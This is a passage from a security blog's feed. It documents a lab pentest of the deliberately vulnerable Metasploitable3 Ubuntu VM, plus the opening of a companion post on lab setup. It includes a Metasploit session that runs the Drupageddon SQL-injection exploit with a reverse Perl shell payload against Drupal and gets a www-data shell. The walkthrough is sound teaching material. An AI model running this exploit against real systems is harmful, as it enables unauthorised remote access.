&lt;h2 id=&quot;port-80-drupal&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#port-80-drupal&quot; aria-label=&quot;port 80 drupal permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Port 80: Drupal&lt;/h2&gt;
&lt;p&gt;In my previous post (&lt;a href=&quot;%7B%25%20post_url%202018-07-08-metasploitable3-pentesting-the-ubuntu-linux-version-part1%20%25%7D&quot;&gt;Pentesting Metasploitable3 using SQL Injection&lt;/a&gt;), I investigated the Apache web server running on port 80. In the directory listing provided by the web server was a Drupal install.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/9ef3e7f39a223d1e503690b2d2409fbd/7762d/port80.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 78.48101265822784%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACX0lEQVQ4y6VUa3OiQBDk//+oiyn1EqPnCx9EK4qAgCA+QDBnCZ3pVcydfrq6reqacXe2t+eB2vl8xuFwQJIkYhPll0jT9MGnvcRe7pQ4Ho8oigKa7/sYDAZ4f5/AMAyMx2NlR6MR6vU6Go2GQqVSQa1WQ7PZxGQykfh39Pt9VKtVtU+QVLNtWwXxEonLYEPQ7XbRarWg67q6TEsMh0MFxhP0O52OUqo5joPWrzZms5lSx8PJdIogCBBFkbJhGMJ1Pcznc5imCcuy1P5qtVLZ9Ho9JYjl0Ja2iWHzGUNJkWm2RO1PkU8lDKQyqqQC/qZP5fzdbreV5T3GK4W+50LvNFWwrkvKUstupw3WNoo2WK+jGzab7dXfXM/WsrdRDfI8D3EcQwuCEC+vDTw9VeTFN0l9gp6oOp0+8S9rv9+XhMFtU0oiyi7+bgepVYGPj1xSyuWskMdyLBa57J2leWfpaiGRuYrfbrffhLGwZ1mG5TKF46T4/Myk6AdpQiJNOAjRQR5KYduMyWQvE+JM4khWXAXsroQrH2b/BX39N+LkOwXHsQSmELti56Igup6cr6ouZBzmB8K35x8wBgnm0wxZnCGORI1lw5IZ9Txf1FiqAbG8mOckwR+4Jwx8dF/rMPQEH0aKQTuBK2k6ji1EC3DwCXadZblfD4Sh1NA1Z5ibW1EUw1zsEK53oigUkpUaXoLDzU5yTNgA4nQ63Qj/akoos7Xfb2TSY+lcosj4IgnKPwH6vFTu05ZkXCTjvsbPy3VdUREoRRdVwU0ZUy39e/CMA03LT5gl0fI8V8z/C37HXF+pXKfzJ5p5NAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Directory listing of Apache on port 80&quot;
        title=&quot;Directory listing of Apache on port 80&quot;
        src=&quot;/static/9ef3e7f39a223d1e503690b2d2409fbd/f058b/port80.png&quot;
        srcset=&quot;/static/9ef3e7f39a223d1e503690b2d2409fbd/c26ae/port80.png 158w,
/static/9ef3e7f39a223d1e503690b2d2409fbd/6bdcf/port80.png 315w,
/static/9ef3e7f39a223d1e503690b2d2409fbd/f058b/port80.png 630w,
/static/9ef3e7f39a223d1e503690b2d2409fbd/7762d/port80.png 649w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;I found the presence of Drupal to be interesting. This was a technology that I had barely used and was interested to investigate further. A quick exploit search in the Metasploit Framework revealed a few exploits available to target Drupal. Additionally, the &lt;code class=&quot;language-text&quot;&gt;searchsploit&lt;/code&gt; listed even more, usually with a specific version that was vulnerable.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Drupal OpenID External Entity Injection
auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Drupal Views Module Users Enumeration
exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  Drupal HTTP Parameter Key/Value SQL Injection
exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Drupal CODER Module Remote Command Execution
exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Drupal RESTWS Module Remote PHP Code Execution
exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  PHP XML-RPC Arbitrary Code Execution&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I started by having a look over the source code for the Drupal website. I noticed some information about the website structure and different subdirectories that all originated from the Drupal folder in the &lt;code class=&quot;language-text&quot;&gt;/var/www/html/drupal&lt;/code&gt; directory. &lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/c8edc6bc1c5a0b99da455a07b98efa79/d0143/drupal-source-code.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 54.43037974683544%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACJElEQVQoz1VRa3OiQBDk//+qVF0llxhOBZSnICAP0eUhLAhq0je7xA+B6prZ2d2enl6l6zocj0ecTicURSEhclELggC7nQ/f97Hf7+U6DEO59zwnkCSJPMM5hxJEMd4WKv6pKjRNg2EYWK/XWC5X+PxUZb5araHrOtY/+7ZtwzJNbDYbwlbeWywWyLIMShwGWC1nssXHXxkFRM3zHFIUkLId/J0L1zZhWRatfWy2W7x/vFNjlRovoJIgoVwpGUn2IujqhtQksK0DtLWL7bai7jV0jZG6kkavkBxqBPuICBmCsEJ8aJDnFcqykaMzxqB0vENdNHCXLmznTIQxTC1EFPXkTYs4LkhljcOhQ5LWVMvo8o3UjOTjRIRXNM035WfprySM9zE82yUVMVw3gEG+CM9MU/hlklqd1Go0pgGH/GP5CW3XoO9bdN0FwBfGcSSl5UwY0Rg714MfELHnE5FNJKY033EcauJR7iAKI/COY7xOmKYJt9tNRvGJvKqqH4V+DNuw6GJCr+eRbyYp3MpXfJKKxzANE8f4iLYRyjpJfrlc8Lg/qMk4E7a0IYrZKUNeVmCE4lziTPFcnlHWpYysYihYQfsMTd2ADxy852h5i4EPEnVdQ6krMrw4wDt6qPsKd/qvjyvGrxHjY4ZYD/dhjo85Xu9X9Lcew23A/fuOcSIPGXkonvr19RUvf15g2RbyLEeapL+RpsjS7Fd85k9EUYS2bfEfJggmWiUTEQUAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Insight into the Drupal directory structure&quot;
        title=&quot;Insight into the Drupal directory structure&quot;
        src=&quot;/static/c8edc6bc1c5a0b99da455a07b98efa79/f058b/drupal-source-code.png&quot;
        srcset=&quot;/static/c8edc6bc1c5a0b99da455a07b98efa79/c26ae/drupal-source-code.png 158w,
/static/c8edc6bc1c5a0b99da455a07b98efa79/6bdcf/drupal-source-code.png 315w,
/static/c8edc6bc1c5a0b99da455a07b98efa79/f058b/drupal-source-code.png 630w,
/static/c8edc6bc1c5a0b99da455a07b98efa79/40601/drupal-source-code.png 945w,
/static/c8edc6bc1c5a0b99da455a07b98efa79/d0143/drupal-source-code.png 1025w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;I wanted to know the specific Drupal version that was running on the Metasploitable3 server. After a few Google searches and some skim-reading. I discovered a file named &lt;code class=&quot;language-text&quot;&gt;blog.info&lt;/code&gt; in the &lt;code class=&quot;language-text&quot;&gt;drupal/modules/blog&lt;/code&gt; directory that stored version information. &lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/cd90b16f93bc9a6a164533c632f13050/61c63/drupal-directory-listing.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 81.64556962025317%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACcElEQVQ4y41UiVLiQBTk/39pXXFRkZJCuY8QgQjIfYgBAklou58FK1i1tanqmjczb3p63pFEEARYLpdnmM/nmM1mhul0aricLxYL85U9mUzMPhwOSLTbbRQKBVQqFUOpVEI6nTakUinc39/j7u7OxoeHB7O1VywWUa1Wzc5kMra/2+2QaDabyD09mUMul8MT7Xw+j3q9jnK5bKPjOJBfo9GwuUbNBZHKT+c2mw0SbtNBuZink2PqnrlRq9Xguq4Rye50Onh9fSXB15qgea/XM3Kdy2az2G63SHguFRSzqNUb5pihdKmVo+M0GYYqVdRILMUVU3hUpUtFKnKtm0It/Lq6QvL6mofKdKTK52fc3v5hXFJ4fEybnc1mkEz+ZlyTDEkOVzwjvL29QZ+StF6vkRiNRszUhJldottdMVs+fN/nzQs+cUgVU/T7C+4tqGQOz5tz750ES2Z3jI+PDyNUZRjhZDLl9IAwPFBhSIcIURQzbhFarZhPiTAYxLQjW2s0Ql4SskRw9p0UdjotPq3A2yMiwMtLwJsDkgbY77e8KDghinaI4z0RWs19IT4nbLddxkixA2+XOmC1WltmB4MBn9c3DIdD7kVnqo6kF4QvDHSJTwOTsecGmH7/G2HPxm63eyL8TvSDsNVycXOjqgc7JuSzwTj6UAd9J/Q873T4nwq7XY9l4FpCPG/L9gnx/r5iZnsYj8dGpkrQqNba7/eGvzE8/Cyb0WjI0hlxcUaSkRGp4fUzUDkc5xrlr/XLTz8HI1SwNfH9NRc2tqg6FGQf50dbUEfoLyWo3aRYl1mnqDBV7XqSxkv7f9Dv9+0FcRzjEw4NoOPG7xrrAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Drupal directory listing&quot;
        title=&quot;Drupal directory listing&quot;
        src=&quot;/static/cd90b16f93bc9a6a164533c632f13050/f058b/drupal-directory-listing.png&quot;
        srcset=&quot;/static/cd90b16f93bc9a6a164533c632f13050/c26ae/drupal-directory-listing.png 158w,
/static/cd90b16f93bc9a6a164533c632f13050/6bdcf/drupal-directory-listing.png 315w,
/static/cd90b16f93bc9a6a164533c632f13050/f058b/drupal-directory-listing.png 630w,
/static/cd90b16f93bc9a6a164533c632f13050/61c63/drupal-directory-listing.png 693w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Opening the file revealed the installed version of Drupal was 7.5.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/d0518aeeb932d04fafde79ce0030f8e0/d0cc0/drupal-version.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 46.835443037974684%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABM0lEQVQoz22S147CQAxF8/9fh0IoIYWSAoQkSCmQ8uDV8cqrgPbhyjO259rXY6dpGsmyTIqikPP5LNfrVW632x/yPBff9yWKIrnf7+ojBxBLkkRjYRhK13XipGkq2+1W9vu9bDYbuVwuSgw4n04n8TxPSXmMz0AOZLxbr9dSVZU4JLmuq4Q8pgCdPB4PRVmWeh+G4V+M4yjzPMs0TfJ6vX47XK1WWo22se/3+wMkfvuWMYDcvu/FoQNIbD7M5fl8atCSsN/ntm0V+CDGKiG66Qy54Hg8qlQbPoUowsz4OO5Y4pz51A9CZohkyPjtw+GgyVRnLsxoae289AOT71CNDiChW+uIUSAda59DLqjrWnPxY+1MEyoZmbYitjI2giAIdAMYy2630/Uhn3Wx/YzjWJVB+AOAJ6BPKEMndAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Drupal version&quot;
        title=&quot;Drupal version&quot;
        src=&quot;/static/d0518aeeb932d04fafde79ce0030f8e0/f058b/drupal-version.png&quot;
        srcset=&quot;/static/d0518aeeb932d04fafde79ce0030f8e0/c26ae/drupal-version.png 158w,
/static/d0518aeeb932d04fafde79ce0030f8e0/6bdcf/drupal-version.png 315w,
/static/d0518aeeb932d04fafde79ce0030f8e0/f058b/drupal-version.png 630w,
/static/d0518aeeb932d04fafde79ce0030f8e0/d0cc0/drupal-version.png 732w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;From here, I investigated some exploits and started testing them out against Metasploitable3.
I was specifically selecting any exploits for version 7.5 but was having no luck. In the end, I discovered the &lt;code class=&quot;language-text&quot;&gt;drupal_drupageddon&lt;/code&gt; exploit which was successful against the Drupal install on Metasploitable3.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;msf &gt; use exploit/multi/http/drupal_drupageddon

msf exploit(multi/http/drupal_drupageddon) &gt; set rhost 192.168.19.20
rhost =&gt; 192.168.19.20

msf exploit(multi/http/drupal_drupageddon) &gt; set targeturi /drupal/
targeturi =&gt; /drupal/

msf exploit(multi/http/drupal_drupageddon) &gt; set payload php/reverse_perl 
payload =&gt; php/reverse_perl

msf exploit(multi/http/drupal_drupageddon) &gt; exploit

[*] Started reverse TCP handler on 192.168.19.10:4444 
[*] Command shell session 6 opened (192.168.19.10:4444 -&gt; 192.168.19.20:47667) at 2018-07-08 00:06:22 -0400&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;targeturi&lt;/code&gt; was set to &lt;code class=&quot;language-text&quot;&gt;/drupal/&lt;/code&gt; instead of root (&lt;code class=&quot;language-text&quot;&gt;/&lt;/code&gt;) as the drupal install was in the &lt;code class=&quot;language-text&quot;&gt;drupal&lt;/code&gt; directory on the Apache web server. After the exploit ran I was, again, unsuccessful! The &lt;code class=&quot;language-text&quot;&gt;whoami&lt;/code&gt; command revealed I was… the &lt;code class=&quot;language-text&quot;&gt;www-data&lt;/code&gt; user. What was very interesting was that the &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon&quot;&gt;
Vulnerability &amp;#x26; Exploit Database&lt;/a&gt; stated the exploit only worked against Drupal 7.0 and 7.31 (was fixed in 7.32). The server apparently had version 7.5 and was still vulnerable. Anyway, no higher level of access was gained. &lt;/p&gt;
&lt;h2 id=&quot;resources&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#resources&quot; aria-label=&quot;resources permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Resources&lt;/h2&gt;
&lt;p&gt;While writing the post and investigating the Metasploitable3 Ubuntu Linux build I came across some very interesting articles written by participants of the Rapid7 Capture the Flag (CTF) competition. I have listed the articles below for reference:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/16667/Metasploitable-3-CTF&quot;&gt;Metasploitable3 CTF Write-up by 16667&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://darkglade.com/2017/12/12/metasploitable3-community-ctf-walkthroughish/&quot;&gt;Metasploitable3 Community CTF – Walkthrough(ish) by DarkGlade&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://ratil.life/metasploitable3-ctf/&quot;&gt;Metasploitable3 CTF by Trevor Steen&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Hopefully, this tutorial gave you some ideas and knowledge about vulnerabilities and exploits concerned with the Metasploitable3 Ubuntu Linux version. This post took a long time to test and document. I just couldn’t get enough of trying different exploit methods and wanted a thorough and well-documented post to share. Hope you enjoyed it, and please leave a comment if you have any information to share! I think there is one more post to come in this series, to finish off testing service exploits, and maybe a little on privilege escalation.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Metasploitable3 - Pentesting the Ubuntu Linux Version (Part 1)]]></title><description><![CDATA[This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series: Part 1: Building…]]></description><link>https://thomaslaurenson.com/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1/</guid><pubDate>Sun, 08 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href=&quot;/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/&quot;&gt;Building the Ubuntu Linux Version&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href=&quot;/blog/2018-07-04-metasploitable3-customizing-the-ubuntu-linux-version&quot;&gt;Customizing the Ubuntu Linux Version&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href=&quot;/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1&quot;&gt;Pentesting the Ubuntu Linux Version - SQL Injection&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href=&quot;/blog/2018-07-09/metasploitable3-pentesting-the-ubuntu-linux-version-part2&quot;&gt;Pentesting the Ubuntu Linux Version - Attacking Services&lt;/a&gt; (You are here!)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#overview-of-flags&quot;&gt;Overview of Flags&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#initial-assessment&quot;&gt;Initial Assessment&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#port-80-payroll-web-application&quot;&gt;Port 80: Payroll Web Application&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#reviewing-the-payroll-app-source-code&quot;&gt;Reviewing the Payroll App Source Code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;My previous two posts covered &lt;a href=&quot;/blog/2018/07/03/metasploitable3-building-the-ubuntu-linux-version/&quot;&gt;Building Metasploitable3&lt;/a&gt; and then &lt;a href=&quot;/blog/2018/07-04-metasploitable3-customizing-the-ubuntu-linux-version&quot;&gt;Customizing Metasploitable3&lt;/a&gt;  where I specified the steps required to build and customize the Metasploitable3 Ubuntu Linux version. In this post, we wrap up this series of posts by performing a pentest, or security audit, on the default Metasploitable3 Ubuntu Linux system. &lt;/p&gt;
&lt;h4 id=&quot;basic-configuration-target-system&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#basic-configuration-target-system&quot; aria-label=&quot;basic configuration target system permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Basic Configuration: Target System&lt;/h4&gt;
&lt;p&gt;The default Metasploitable3 Ubuntu Linux version was used as the target. The default &lt;code class=&quot;language-text&quot;&gt;ubuntu_14.04.json&lt;/code&gt; Packer template was used to build the virtual machine, and no modifications to the default configuration were made. The virtual machine was hosted in VMWare Workstation. The network configuration was set to &lt;em&gt;Host-Only&lt;/em&gt; and the IP address was set to: &lt;code class=&quot;language-text&quot;&gt;192.168.19.20&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id=&quot;basic-configuration-attack-system&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#basic-configuration-attack-system&quot; aria-label=&quot;basic configuration attack system permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Basic Configuration: Attack System&lt;/h4&gt;
&lt;p&gt;Kali Linux version 2018.2 was used as the attack system. The virtual machine used was downloaded from &lt;a href=&quot;https://images.offensive-security.com/virtual-images/kali-linux-2018.2-vm-amd64.zip&quot;&gt;Offensive Security&lt;/a&gt;. The only modifications to the system were that an update was performed. Again, the network configuration was set to &lt;em&gt;Host-Only&lt;/em&gt; and the IP address was set to: &lt;code class=&quot;language-text&quot;&gt;192.168.19.10&lt;/code&gt;.&lt;/p&gt;
